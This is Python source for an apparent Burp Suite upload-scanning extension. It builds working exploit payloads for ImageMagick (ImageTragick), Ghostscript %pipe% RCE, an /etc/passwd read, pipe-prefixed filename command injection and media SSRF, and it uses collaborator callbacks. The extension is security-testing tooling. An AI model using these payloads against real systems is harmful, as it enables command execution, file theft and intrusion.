
import cgi
from copy import copy
import os
import random
import string
import struct
import urlparse  # urlparser for custom HTTP services

from fingerpings.AviM3uXbin import AviM3uXbin
from fingerpings.Fingerping import Fingerping
from fingerpings.FingerpingImages import FingerpingImages
from helpers.ImageHelpers import ImageHelpers
from helpers.checks_helper import Checks_Helper
from insertionPoints.InsertionPointProviderForActiveScan import InsertionPointProviderForActiveScan
from misc.BackdooredFile import BackdooredFile
from misc.Constants import Constants
from misc.CustomScanIssue import CustomScanIssue
from misc.Downloader import DownloadMatcher
from misc.Sender import Sender
from php_rce import php_rce_check
from timeout_and_dos import Timeout_and_Dos
from xss import xss_check
from xxe import xxe_checks
from helpers.FloydsHelpers import FloydsHelpers
from misc.BurpCollaborator import BurpCollaborator, CollaboratorMonitorThread
from misc.Misc import ColabTest, SsiPayloadGenerator, Xbm
from attacks import Attacks
from misc.StopScanException import StopScanException


class Checks():
    def __init__(self, burp_extender):
        self.burp_extender = burp_extender
        self.checks_helper = Checks_Helper(burp_extender)
        self.callback_helpers = burp_extender._callbacks.getHelpers()
        self._callbacks = self.burp_extender._callbacks
        self.dl_matchers = burp_extender.dl_matchers
        self.sender = Sender(self._callbacks, self.burp_extender)
        self.attacks = Attacks(self._callbacks, self.dl_matchers, self.burp_extender)

        # TODO Burp API limitation: IBurpCollaboratorClientContext persistence
        # Find out if CollaboratorMonitorThread is already running.
        # Although this works and we can find our not-killed Thread, it will not have the
        # functions of CollaboratorMonitorThread, so for example the "add" function
        # isn't there anymore.
        # for thread in Thread.getAllStackTraces().keySet():
        #     print(thread.getName())
        #     if thread.name == CollaboratorMonitorThread.NAME:
        #         print("Found running CollaboratorMonitorThread, reusing")
        #         self.collab_monitor_thread = thread
        #         self.collab_monitor_thread.resume(self)
        #         break
        # else:
        #     # No break occured on the for loop
        #     # Create a new thread
        #     print("No CollaboratorMonitorThread found, starting a new one")
        #     self.collab_monitor_thread = CollaboratorMonitorThread(self)
        #     self.collab_monitor_thread.start()
        self.collab_monitor_thread = CollaboratorMonitorThread(self.burp_extender)
        self.collab_monitor_thread.start()

    def extensionUnloaded(self):
        self.collab_monitor_thread.extensionUnloaded()

    def do_checks(self, injector):
        burp_colab = BurpCollaborator(self._callbacks)
        if not burp_colab.is_available:
            burp_colab = None
            print("Warning: No Burp Collaborator will be used")
        colab_tests = []

        # We need to make sure that the global download matchers are from now on active for the URL we scan
        url = FloydsHelpers.u2s(self.callback_helpers.analyzeRequest(injector.get_brr()).getUrl().toString())
        self.burp_extender.dl_matchers.add_collection(url)

        scan_was_stopped = False

        try:
            # Sanity/debug check. Simply uploads a white picture called screenshot_white.png
            print("Doing sanity check and uploading a white png file called screenshot_white.png")
            self._sanity_check(injector)
            # Make sure we don't active scan again a request we are active scanning right now
            # Do this by checking for redl_enabled
            if injector.opts.modules['activescan'].isSelected() and injector.opts.redl_enabled:
                brr = injector.get_brr()
                service = brr.getHttpService()
                self._callbacks.doActiveScan(service.getHost(), service.getPort(), 'https' in service.getProtocol(), brr.getRequest())
            # Imagetragick - CVE based and fixed, will deprecate at one point
            if injector.opts.modules['imagetragick'].isSelected():
                print("\nDoing ImageTragick checks")
                colab_tests.extend(self._imagetragick_cve_2016_3718(injector, burp_colab))
                colab_tests.extend(self._imagetragick_cve_2016_3714_rce(injector, burp_colab))
                self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
                self._imagetragick_cve_2016_3714_sleep(injector)
                self._bad_manners_cve_2018_16323(injector)
            # Magick (ImageMagick and GraphicsMagick) - generic, as these are exploiting features
            if injector.opts.modules['magick'].isSelected():
                print("\nDoing Image-/GraphicsMagick checks")
                colab_tests.extend(self._magick(injector, burp_colab))
                self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
            # Ghostscript - CVE based and fixed, will deprecate at one point
            if injector.opts.modules['gs'].isSelected():
                print("\nDoing Ghostscript checks")
                colab_tests.extend(self._ghostscript(injector, burp_colab))
                self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
            # LibAVFormat - generic, as the file format will always support external URLs
            if injector.opts.modules['libavformat'].isSelected():
                print("\nDoing LibAVFormat checks")
                colab_tests.extend(self._libavformat(injector, burp_colab))
                self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
            # PHP RCEs - generic, as there will always be someone who screws up PHP:
            if injector.opts.modules['php'].isSelected():
                print("\nDoing PHP code checks")
                php_rce_check(injector, self.burp_extender._globalOptionsPanel, self._callbacks, self.burp_extender.dl_matchers, self.burp_extender)
            # JSP RCEs - generic, as there will always be someone who screws up JSP:
            if injector.opts.modules['jsp'].isSelected():
                print("\nDoing JSP code checks")
                self._jsp_rce(injector)
            # ASP RCEs - generic, as there will always be someone who screws up ASP:
            if injector.opts.modules['asp'].isSelected():
                print("\nDoing ASP code checks")
                self._asp_rce(injector)
            # htaccess - generic
            # we do the htaccess upload early, because if it enables "Options +Includes ..." by uploading a .htaccess
            # then we can successfully do Server Side Includes, CGI execution, etc. in a later module...
            if injector.opts.modules['htaccess'].isSelected():
                print("\nDoing htaccess/web.config checks")
                colab_tests.extend(self._htaccess(injector, burp_colab))
                self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
            # CGIs - generic
            if injector.opts.modules['cgi'].isSelected():
                print("\nDoing CGIs checks")
                colab_tests.extend(self._cgi(injector, burp_colab))
                self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
            # SSI - generic
            if injector.opts.modules['ssi'].isSelected():
                print("\nDoing SSI/ESI checks")
                colab_tests.extend(self._ssi(injector, burp_colab))
                colab_tests.extend(self._esi(injector, burp_colab))
                self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
            # XXE - generic
            if injector.opts.modules['xxe'].isSelected():
                print("\nDoing XXE checks")
                xxe_checks(injector, burp_colab, colab_tests, self.burp_extender, self._callbacks, self.collab_monitor_thread)
            # XSS - generic
            if injector.opts.modules['xss'].isSelected():
                print("\nDoing XSS checks")
                xss_check(injector, self.burp_extender._globalOptionsPanel, self._callbacks, self.burp_extender.dl_matchers, self.burp_extender)
            # eicar - generic
            if injector.opts.modules['eicar'].isSelected():
                print("\nDoing eicar checks")
                self._eicar(injector)
            # pdf - generic
            if injector.opts.modules['pdf'].isSelected():
                print("\nDoing pdf checks")
                colab_tests.extend(self._pdf(injector, burp_colab))
                self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
            # other ssrf - generic
            if injector.opts.modules['ssrf'].isSelected():
                print("\nDoing other SSRF checks")
                colab_tests.extend(self._ssrf(injector, burp_colab))
                self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
            # CSV/spreadsheet - generic
            if injector.opts.modules['csv_spreadsheet'].isSelected():
                print("\nDoing CSV/spreadsheet checks")
                colab_tests.extend(self._csv_spreadsheet(injector, burp_colab))
                self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
            # path traversal - generic
            if injector.opts.modules['path_traversal'].isSelected():
                print("\nDoing path traversal checks")
                self._path_traversal_archives(injector)
            # Polyglot - generic
            if injector.opts.modules['polyglot'].isSelected():
                print("\nDoing polyglot checks")
                colab_tests.extend(self._polyglot(injector, burp_colab))
                self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
            # Fingerping - generic
            if injector.opts.modules['fingerping'].isSelected():
                print("\nDoing fingerping checks")
                self._fingerping(injector)

            # TODO feature: "Analyzer module"
            # new module that uploads a png, a jpeg, a gif, etc. and checks in the downloaded
            # content which byte sequences of a certain length (eg. 6) survived transformation on the server
            # basically we could use something like python's SequenceMatcher to check where the files match...
            # Additionally, make the module analyze certain things such as "if we upload a PNG, is the
            # returned content-type in the redownloader a PNG?" with other types as well
            # What would also be a nice feature is to upload a PNG and download it again. Then use that PNG
            # as a starting point for attacks as we can be sure that is a valid one.

            # Upload quirks - generic
            if injector.opts.modules['quirks'].isSelected():
                print("\nDoing quirk checks")
                self._quirks_with_passive(injector)
                self._quirks_without_passive(injector)
            # Generic URL replacer module - obviously generic
            if injector.opts.modules['url_replacer'].isSelected():
                print("\nDoing generic URL replacement checks")
                colab_tests.extend(self._generic_url_replacer(injector, burp_colab))
                self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)
            # Recursive uploader - generic
            if injector.opts.modules['recursive_uploader'].isSelected():
                print("\nDoing recursive upload checks")
                self._recursive_upload_files(injector, burp_colab)
            # Fuzz - generic
            if injector.opts.modules['fuzzer'].isSelected():
                print("\nDoing fuzzer checks")
                self._fuzz(injector)
        except StopScanException:
            scan_was_stopped = True

        # Just to make sure (maybe we write a new module above and forget this call):
        self.collab_monitor_thread.add_or_update(burp_colab, colab_tests)

        # DoSing the server is best done at the end when we already know about everything else...
        # Timeout and DoS - generic
        if not scan_was_stopped:
            try:
                if injector.opts.modules['dos'].isSelected():
                    print("\nDoing timeout and DoS checks")
                    Timeout_and_Dos.check(injector, self.burp_extender)
            except StopScanException:
                pass
        if injector.opts.redl_enabled:
            injector.opts.scan_was_stopped()
        print("\nFinished")

    def _create_issue_template(self, base_request_response, name, detail, confidence, severity):
        return CustomScanIssue(base_request_response, self.callback_helpers, name, detail, confidence, severity)

    # Module functions
    def _sanity_check(self, injector):
        content = "eJzrDPBz5+WS4mJgYOD19HAJAtIrgXgmBxuQDFkv1cTAwFiT6ewc4OnsrBBQlJ+WmZPKwKAxMTkhQctTR+NEYmJCwomz2ppcRe" \
                  "VBHR09QQn7Dx84e+CwwpGEowrzZsTEPJAQeHC4Qbhm97EDHIv0Xzed8fr8p/Lysq01/8TM1s8sClO12vG1kbHcK6vQiJlZmX3C" \
                  "3DlBc+ZwpzxnuGl1ktVV1eEbj0L09j1LGI7YMaZ0izDKcqTcZ9x4WfENv0KZ0IyzR5jChIWe8KR4M9xk8hTYxtYxly8xuuHGSc" \
                  "lOTYdt7Cf0OqQPNFw+7HrwzoGg6xMbdnuy7bRcamDtsPDo5FniUjxF7AKnDSoMdhhoGMwwljCIMHphZDFtSdiUBhGr5+IhYqnL" \
                  "0qdoWDA5m4UetLTfvmCLylYP94PG+pH+7gdPHLjAsIRPJF1gsT17o2+6iHW/wOn4EwcSVp45cOBOs4D3rGMHNtTyMzcf0WyZcc" \
                  "qGja0um60t9zmXULfQQ770P8ecOuLnpOWwJH62MDTYcO/3//+bpZiZf6uwte0X/v///94X///v7278xvz4jQMfg0p55oOebCF+" \
                  "YDzMzQyJKInw9bFKzs/VS0zJT0rVq8gtYAABmworIDM3tSRRoSI3J6/YqsJWCazCCsgGCesrKYCVlGTbKkX4Big45xelKpjqme" \
                  "gZKNlxKSgo2BSlpFkFubhBtQN5tkoZJSUFVvr65eXleuXGevlF6fqGlpaW+gZG+kZGukAVusWVeSWJFbp5xcoQQ2DmuKQWJxdl" \
                  "FpRk5ucpgPiJSfmlJbZKSlA1EACxKLUiE2FTXjHUW0AP6oNk9A31DPThZoOMB4laBWRWpOZEuGTmpuYVA+2wMzSztNHHKoNVZy" \
                  "SSTlNjZJ2RGDpt9NE8BAktfWhw2XHZ6MOD3o7rEqOIDwMD02NPF8eQCsa3lw7yMijwHDFI+D+XO6nL5g6n38rve6L9Ggsahe+l" \
                  "zWLaz7BE4Qm3w6z6iY0TjCboM2T+c2VzOuWwj2HJT3FJDk3mn0wTnsWnKCzhGVU0qmiQKRJ/tZNVr/U4hzKo9PF09XNZ55TQBA" \
                  "B94FvQ".decode("base64").decode("zlib")
        types = [('', '.png', 'image/png')]
        self.sender.simple(injector, types, "SanityCheck", content, redownload=False, randomize=False)

    def _imagetragick_cve_2016_3718(self, injector, burp_colab):
        colab_tests = []
        # Burp community edition doesn't have Burp collaborator
        if not burp_colab:
            return colab_tests
        if injector.opts.file_formats['mvg'].isSelected():
            # burp collaborator based CVE-2016-3718
            basename = Constants.FILE_START + "Im18Colab"
            # tested to work on vulnerable ImageMagick:
            content_mvg = "push graphic-context\n" \
                          "viewbox 0 0 {} {}\n" \
                          "fill 'url({})'\n" \
                          "pop graphic-context".format(injector.opts.image_width, injector.opts.image_height, Constants.MARKER_COLLAB_URL)

            name = "Imagetragick CVE-2016-3718"
            severity = "Medium"
            confidence = "Certain"
            detail = "A Burp Colaborator interaction was detected when uploading an MVG imagetragick CVE-2016-3718 payload " \
                     "which contains a burp colaborator URL. This means that Server Side Request Forgery is possible. " \
                     "Check https://imagetragick.com/ for more details about CVE-2016-3718. Interactions for CVE-2016-3718:<br><br>"
            issue = self._create_issue_template(injector.get_brr(), name, detail, confidence, severity)
            colab_tests.extend(self.sender.send_collaborator(injector, burp_colab, Constants.IM_MVG_TYPES, basename, content_mvg, issue))
        return colab_tests

    def _imagetragick_cve_2016_3714_sleep(self, injector):
        # time based (sleep) CVE-2016-3714
        name = "Imagetragick CVE-2016-3714 (sleep based)"
        severity = "High"
        confidence = "Certain"
        detail = "A timeout was reliably detected twice when uploading an {} image with an imagetragick payload that " \
                 "executes the {} command to delay the response delivery. Therefore arbitrary command execution seems possible. " \
                 "Check https://imagetragick.com/ for more details, also check for CVE-2016-3717 manually."
        svg = '<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" ' \
              '"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"> <svg width="{}px" height="{}px" ' \
              'version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">' \
              '<image xlink:href="' + Constants.MARKER_CACHE_DEFEAT_URL + 'image.jpg`{} {}{}`" x="0" ' \
              'y="0" height="{}px" width="{}px"/></svg>'
        mvg = "push graphic-context\n" \
              "viewbox 0 0 {} {}\n" \
              "fill 'url(" + Constants.MARKER_CACHE_DEFEAT_URL + "\";{} {}\"{})'\n" \
              "pop graphic-context"
        filename = Constants.FILE_START + "ImDelay"

        for cmd_name, cmd, factor, args in Checks_Helper.get_sleep_commands(injector):
            if injector.opts.file_formats['mvg'].isSelected():
                issue = self._create_issue_template(injector.get_brr(), name, detail.format("MVG", cmd), confidence, severity)
                content_mvg = mvg.format(injector.opts.image_width, injector.opts.image_height, cmd, injector.opts.sleep_time * factor, args)
                self.checks_helper.send_sleep_based(injector, filename + "Mvg" + cmd_name, content_mvg, Constants.IM_MVG_TYPES, injector.opts.sleep_time, issue)
            if injector.opts.file_formats['svg'].isSelected():
                issue = self._create_issue_template(injector.get_brr(), name, detail.format("SVG", cmd), confidence, severity)
                content_svg = svg.format(injector.opts.image_width, injector.opts.image_height, cmd, injector.opts.sleep_time * factor, args, injector.opts.image_height, injector.opts.image_width)
                self.checks_helper.send_sleep_based(injector, filename + "Svg" + cmd_name, content_svg, Constants.IM_SVG_TYPES, injector.opts.sleep_time, issue)

        return []

    def _bad_manners_cve_2018_16323(self, injector):
        if not injector.opts.redl_enabled or not injector.opts.redl_configured:
            # this module can only find leaks in images when the files are downloaded again
            return
        # CVE-2018-16323, see https://github.com/ttffdd/XBadManners
        basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "BadManners"
        content = Xbm("".join(random.sample(string.ascii_letters, 5))).create_xbm(injector.opts.image_width,
                                   injector.opts.image_height)
        urrs = self.sender.simple(injector, Constants.XBM_TYPES, basename, content, redownload=True)
        for urr in urrs:
            if urr and urr.download_rr:
                resp = urr.download_rr.getResponse()
                if resp:
                    resp = FloydsHelpers.jb2ps(resp)
                    i_response_info = self.callback_helpers.analyzeResponse(urr.download_rr.getResponse())
                    body_offset = i_response_info.getBodyOffset()
                    body = resp[body_offset:]
                    picture_width, picture_height, fileformat = ImageHelpers.image_width_height(body)
                    if picture_width and picture_height and fileformat:
                        has_been_resized = False
                        if picture_width >= 200 or picture_height >= 200:
                            # We first resize the picture to a small one so we don't have to check
                            # too many pixels (performance)...
                            thumbnail = ImageHelpers.rescale_image(200, 200, body)
                            if thumbnail:  # only if body was an image that ImageIO can parse
                                # Now get the pixels of the picture
                                body = thumbnail
                                has_been_resized = True
                                picture_width = 200
                                picture_height = 200
                        rgbs = ImageHelpers.get_image_rgb_list(body)
                        # As we send a first byte that is not white,
                        # let's ignore the first few pixels... (that's what a non-vulnerable imagemagick turns black)
                        for i in range(0, picture_width/4):
                            rgbs[i] = -1
                        body = ImageHelpers.get_image_from_rgb_list(picture_width, picture_height, fileformat, rgbs)
                        white = rgbs.count(-1)
                        # When doing "convert in.xbm out.png", the resulting PNG has only -16777216 as black...
                        black = 0
                        black_rgb_values = [-16777216]
                        # But with "convert in.xbm -size widthxheight out.jpeg", the resulting JPEG has as well others
                        # which are black pixels turned into gray values
                        # so this is not super accurate, but it doesn't matter too much, because the real false positive
                        # will be decided with is_grayscale
                        black_rgb_values.extend([-263173, -197380, -131587, -65794, -131587, -12434878, -657931,
                                                 -855310, -394759, -592138, -526345, -328966, -986896, -460552])
                        for value in black_rgb_values:
                            black += rgbs.count(value)
                        other = len(rgbs) - white - black
                        examples = [x for x in rgbs if x != -1 and x not in black_rgb_values]
                        other_examples = set(examples[:50])
                        if white < picture_width * picture_height:
                            # We uploaded a white picture, but we got something with not only white pixels
                            if ImageHelpers.is_grayscale(body):
                                # When it was resized, and it is only grayscale, then this could really be a true positive
                                # Black pixels often go gray when an image is resized (on the server side or here what we
                                # just did for performance reason) to a smaller size
                                name = "Bad Manners (CVE-2018-16323)"
                                severity = "High"
                                if other > 0:
                                    confidence = "Tentative"
                                else:
                                    confidence = "Firm"
                                detail = "The server might use a vulnerable version of Imagemagick. It is vulnerable to " \
                                     "CVE-2018-16323, see https://github.com/ttffdd/XBadManners. We uploaded a " \
                                     "fully white XBM file format picture (black and white format) with a known memory " \
                                     "disclosure payload and the server sent back an image that has not only white pixels. " \
                                     "This could also just mean that the server adds other colors to our picture, which is " \
                                     "countered by checking that the image is only grayscale. The image returned was only " \
                                     "grayscale. However, if the server modifies white picture to include gray or black " \
                                     "pixels this could still be a false positive. Please verify manually. <br>" \
                                     "Number of white pixels: {} <br>" \
                                     "Number of black/gray pixels (estimation): {} <br>" \
                                     "Number of other pixels (estimation): {} <br>" \
                                     "First 50 other pixel RGB integer values: <br>" \
                                     "{}".format(white, black, other, other_examples)
                                issue = self._create_issue_template(injector.get_brr(), name, detail, confidence, severity)
                                issue.httpMessagesPy = [urr.upload_rr, urr.download_rr]
                                self.burp_extender._add_scan_issue(issue)
                            #else:
                                #print("Although we uploaded a white XBM picture, the server returned a non-grayscale picture...")

    def _imagetragick_cve_2016_3714_rce(self, injector, burp_colab):
        colab_tests = []
        # Burp community edition doesn't have Burp collaborator
        if not burp_colab:
            return colab_tests

        # burp collaborator based CVE-2016-3714
        name = "Imagetragick CVE-2016-3714 (collaborator based)"
        severity = "High"
        confidence = "Certain"
        detail = "A Burp Colaborator interaction was detected when uploading a {} imagetragick CVE-2016-3714 payload " \
                 "which contains a burp colaborator payload as a {} command. Therefore arbitrary command execution seems possible. " \
                 "Check https://imagetragick.com/ for more details about CVE-2016-3714. Interactions for CVE-2016-3718:<br><br>"

        svg = '<?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" ' \
              '"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"> <svg width="{}px" height="{}px" ' \
              'version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">' \
              '<image xlink:href="' + Constants.MARKER_CACHE_DEFEAT_URL + 'image.jpg`{} {}`" x="0" ' \
              'y="0" height="{}px" width="{}px"/></svg>'
        mvg = "push graphic-context\n" \
              "viewbox 0 0 {} {}\n" \
              "fill 'url(" + Constants.MARKER_CACHE_DEFEAT_URL + "\";{} \"{})'\n" \
              "pop graphic-context"

        basename = Constants.FILE_START + "Im3714"

        for cmd_name, cmd, server, replace in Checks_Helper.get_rce_interaction_commands(injector, burp_colab):
            if injector.opts.file_formats['mvg'].isSelected():
                issue = self._create_issue_template(injector.get_brr(), name, detail.format("MVG", cmd), confidence, severity)
                content_mvg = mvg.format(injector.opts.image_width, injector.opts.image_height, cmd, server)
                colab_tests.extend(self.sender.send_collaborator(injector, burp_colab, Constants.IM_MVG_TYPES, basename + "Mvg" + cmd_name,
                                                           content_mvg, issue, replace=replace))

            if injector.opts.file_formats['svg'].isSelected():
                issue = self._create_issue_template(injector.get_brr(), name, detail.format("SVG", cmd), confidence, severity)
                content_svg = svg.format(injector.opts.image_width, injector.opts.image_height, cmd, server,
                                         injector.opts.image_height, injector.opts.image_width)
                colab_tests.extend(self.sender.send_collaborator(injector, burp_colab, Constants.IM_SVG_TYPES, basename + "Svg" + cmd_name,
                                                           content_svg, issue, replace=replace))

        return colab_tests

    def _magick(self, injector, burp_colab):
        colabs = []
        # burp collaborator based passing a filename starting with
        # pipe | makes Image-/GraphicsMagick execute to the -write command
        # As described on https://hackerone.com/reports/212696
        types = [('', Constants.MARKER_ORIG_EXT, '')]
        content = injector.get_uploaded_content()
        name = "Image-/GraphicsMagick filename RCE"
        severity = "High"
        confidence = "Certain"
        base_details = "The manual for GrapicksMagick on http://www.graphicsmagick.org/GraphicsMagick.html specifies: <br>" \
                       "-write &lt;filename&gt; <br>" \
                       "[...] <br>" \
                       "Precede the image file name with | to pipe to a system command. <br><br>" \
                       "Check https://hackerone.com/reports/212696 for more details. "
        detail_colab = "A Burp Colaborator interaction was detected when uploading a filename using a pipe character or similar " \
                        "which included a {} payload with a burp colaborator URL. This means that Remote Command Execution should be possible. " \
                        "The payload template was {} . Interactions:<br><br>"
        detail_sleep = "A delay in the response time was detected twice when uploading a filename using a pipe character or similar " \
                       "which included a {} payload. This means that Remote Command Execution should be possible. " \
                       "The payload template was {} . "

        # Sleep based
        for cmd_name, cmd, factor, args in Checks_Helper.get_sleep_commands(injector):
            basenames = [ "|{} {}{}|a".format(cmd, injector.opts.sleep_time * factor, args),
                          #"|{}%20{}{}|a".format(cmd.replace(" ", "%20"), injector.opts.sleep_time * factor, args.replace(" ", "%20")),
                          "|" + cmd.replace(" ", "${IFS}") + "${IFS}" + str(injector.opts.sleep_time * factor) + args.replace(" ", "%20") + "|a",
                          "1%20-write%20|{}%20{}{}|a".format(cmd.replace(" ", "%20"), injector.opts.sleep_time * factor, args.replace(" ", "%20")),
                          "1${IFS}-write${IFS}|" + cmd.replace(" ", "${IFS}") + "${IFS}" + str(injector.opts.sleep_time * factor) + args.replace(" ", "${IFS}") + "|a",
                          ]
            for basename in basenames:
                details = base_details + detail_sleep.format(cmd_name, basename)
                issue = self._create_issue_template(injector.get_brr(), name, details, confidence, severity)
                self.checks_helper.send_sleep_based(injector, basename, content, types, injector.opts.sleep_time, issue)

        # Burp community edition doesn't have Burp collaborator
        if not burp_colab:
            return colabs

        # Colab based
        for cmd_name, cmd, server, replace in Checks_Helper.get_rce_interaction_commands(injector, burp_colab):
            basenames = [ "|{} {}|a".format(cmd, server),
                          #"|{}%20{}|a".format(cmd.replace(" ", "%20"), server),
                          "|" + cmd.replace(" ", "${IFS}") + "${IFS}" + server + "|a",
                          "1%20-write%20|{}%20{}|a".format(cmd.replace(" ", "%20"), server),
                          "1${IFS}-write${IFS}|" + cmd + "${IFS}" + server + "|a",
                          ]
            for basename in basenames:
                details = base_details + detail_colab.format(cmd_name, basename)
                issue = self._create_issue_template(injector.get_brr(), name, details, confidence, severity)
                # print("Sending basename, replace", repr(basename), repr(replace))
                colabs.extend(self.sender.send_collaborator(injector, burp_colab, types, basename, content, issue, replace=replace))

        return colabs

    def _ghostscript(self, injector, burp_colab):

        # CVE-2016-7977
        basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "GsLibPasswd"
        content = """%!PS
/Size 20 def                             % font/line size
/Line 0 def                              % current line
/Buf 1024 string def                     % line buffer
/Path 0 newpath def
>
/Courier-Bold findfont Size scalefont setfont
1 1 1 setrgbcolor clippath fill          % draw white background
0 0 0 setrgbcolor                        % set black foreground
>
(/etc/passwd) .libfile {
    {
        dup Buf readline
        {
            Path Line moveto show
        }{
            showpage
            quit
        } ifelse
        % next line
        /Line Line Size add def
    } loop
} if"""
        # As we do not want to regex search with a DownloadMatcher (too error prone), we only check if a ReDownloader
        # was configured and we know the response
        urrs = self.sender.simple(injector, Constants.GS_TYPES, basename, content, redownload=True)
        for urr in urrs:
            if urr and urr.download_rr:
                resp = urr.download_rr.getResponse()
                if resp:
                    resp =  FloydsHelpers.jb2ps(resp)
                    if Constants.REGEX_PASSWD.match(resp):
                        name = "Ghostscript Local File Include"
                        severity = "High"
                        confidence = "Firm"

                        detail = "A passwd-like response was downloaded when uploading a ghostscript file with a payload that " \
                                 "tries to include /etc/passwd. Therefore arbitrary file read seems possible. " \
                                 "See http://www.openwall.com/lists/oss-security/2016/09/30/8 for details. " \
                                 "Interactions: <br><br>"
                        issue = self._create_issue_template(injector.get_brr(), name + " CVE-2016-7977", detail, confidence, severity)
                        issue.httpMessagesPy = [urr.upload_rr, urr.download_rr]
                        self.burp_extender._add_scan_issue(issue)

        # CVE-2016-7976 with OutputICCProfile pipe technique
        # CVE-2017-8291 with OutputFile pipe technique
        # TODO feature: look at ghostbutt.com and metasploit implementation and see how they are doing it
        name = "Ghostscript RCE"
        severity = "High"
        confidence = "Certain"
        base_detail = "A ghostscript file with RCE payload was uploaded. See " \
                      "http://www.openwall.com/lists/oss-security/2016/09/30/8 and http://cve.circl.lu/cve/CVE-2017-8291 " \
                      "and http://openwall.com/lists/oss-security/2018/08/21/2 for details. "
        detail_sleep = "A delay was dectected twice when uploading a ghostscript file with a payload that " \
                       "executes a sleep like command. Therefore arbitrary command execution seems possible. " \
                       "The payload used the {} argument ({}) and the payload {}."
        detail_colab = "A burp collaborator interaction was dectected when uploading a ghostscript file with a payload that " \
                       "executes commands with a burp collaborator URL. Therefore arbitrary command execution seems possible. " \
                       "The payload used the {} argument ({}) and the payload {}. Interactions: <br><br>"
        basename = Constants.DOWNLOAD_ME + Constants.FILE_START + "Gs"

        content_original_cve = "%!PS\n" \
                               "currentdevice null true mark /{} (%pipe%{} {} )\n" \
                               ".putdeviceparams\n" \
                               "quit"

        content_2 = "%!PS\n" \
                    "*legal*\n" \
                    "*{{ null restore }} stopped {{ pop }} if*\n" \
                    "*legal*\n" \
                    "*mark /{} (%pipe%{} {}) currentdevice putdeviceprops*\n" \
                    "*showpage*"

        content_ubuntu = "%!PS\n" \
                         "userdict /setpagedevice undef\n" \
                         "save\n" \
                         "legal\n" \
                         "{{ null restore }} stopped {{ pop }} if\n" \
                         "{{ legal }} stopped {{ pop }} if\n" \
                         "restore\n" \
                         "mark /{} (%pipe%{} {}) currentdevice putdeviceprops"

        content_centos = "%!PS\n" \
                         "userdict /setpagedevice undef\n" \
                         "legal\n" \
                         "{{ null restore }} stopped {{ pop }} if\n" \
                         "legal\n" \
                         "mark /{} (%pipe%{} {}) currentdevice putdeviceprops"

        techniques = (
            ("OutputFile", "CVE-2017-8291", content_original_cve),
            ("OutputICCProfile", "CVE-2016-7976", content_original_cve),

            ("OutputFile", "http://openwall.com/lists/oss-security/2018/08/21/2", content_2),
            #("OutputICCProfile", "http://openwall.com/lists/oss-security/2018/08/21/2", content_2),

            # OutputFile worked on a Linux minti 4.8.0-53-generic #56~16.04.1-Ubuntu SMP Tue May 16 01:18:56 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
            # With "identify" and "convert" from ImageMagick 6.8.9-9 Q16 x86_64 2017-03-14
            # But OutputICCProfile didn't:
            #   ./base/gsicc_manage.c:1088: gsicc_open_search(): Could not find %pipe%sleep 6.0
            # | ./base/gsicc_manage.c:1708: gsicc_set_device_profile(): cannot find device profile
            #   ./base/gsicc_manage.c:1088: gsicc_open_search(): Could not find %pipe%sleep 6.0
            # | ./base/gsicc_manage.c:1708: gsicc_set_device_profile(): cannot find device profile
            ("OutputFile", "http://openwall.com/lists/oss-security/2018/08/21/2", content_ubuntu),
            #("OutputICCProfile", "http://openwall.com/lists/oss-security/2018/08/21/2", content_ubuntu),

            ("OutputFile", "http://openwall.com/lists/oss-security/2018/08/21/2", content_centos),
            #("OutputICCProfile", "http://openwall.com/lists/oss-security/2018/08/21/2", content_centos),
        )

        # Sleep based
        for cmd_name, cmd, factor, args in Checks_Helper.get_sleep_commands(injector):
            for param, reference, content in techniques:
                details = base_detail + detail_sleep.format(param, reference, cmd)
                issue = self._create_issue_template(injector.get_brr(), name, details, confidence, severity)
                sleep_content = content.format(
                    #injector.opts.image_width,
                    #injector.opts.image_height,
                    param,
                    cmd,
                    str(injector.opts.sleep_time * factor) + args
                )
                self.checks_helper.send_sleep_based(injector, basename + cmd_name, sleep_content, Constants.GS_TYPES, injector.opts.sleep_time, issue)

        # Burp community edition doesn't have Burp collaborator
        if not burp_colab:
            return []
        colab_tests = []

        # Colab based
        for cmd_name, cmd, server, replace in Checks_Helper.get_rce_interaction_commands(injector, burp_colab):
            for param, reference, content in techniques:
                details = base_detail + detail_colab.format(param, reference, cmd)
                issue = self._create_issue_template(injector.get_brr(), name, details, confidence, severity)
                attack = content.format(
                    #injector.opts.image_width,
                    #injector.opts.image_height,
                    param,
                    cmd,
                    server
                )
                colab_tests.extend(self.sender.send_collaborator(injector, burp_colab, Constants.GS_TYPES, basename + param + cmd_name,
                                                           attack, issue, replace=replace, redownload=True))

        return colab_tests

    def _libavformat(self, injector, burp_colab):
        # TODO: Implement .qlt files maybe? https://www.gnucitizen.org/blog/backdooring-mp3-files/
        # Burp community edition doesn't have Burp collaborator
        if not burp_colab:
            return []

        # burp collaborator based as described on https://hackerone.com/reports/115857
        basename = Constants.FILE_START + "AvColab"
        content_m3u8 = "#EXTM3U\r\n#EXT-X-MEDIA-SEQUENCE:0\r\n#EXTINF:10.0,\r\n{}example.mp4\r\n##prevent cache: {}\r\n#EXT-X-ENDLIST".format(Constants.MARKER_COLLAB_URL, str(random.random()))

        name = "LibAvFormat SSRF"
        severity = "High"
        confidence = "Certain"
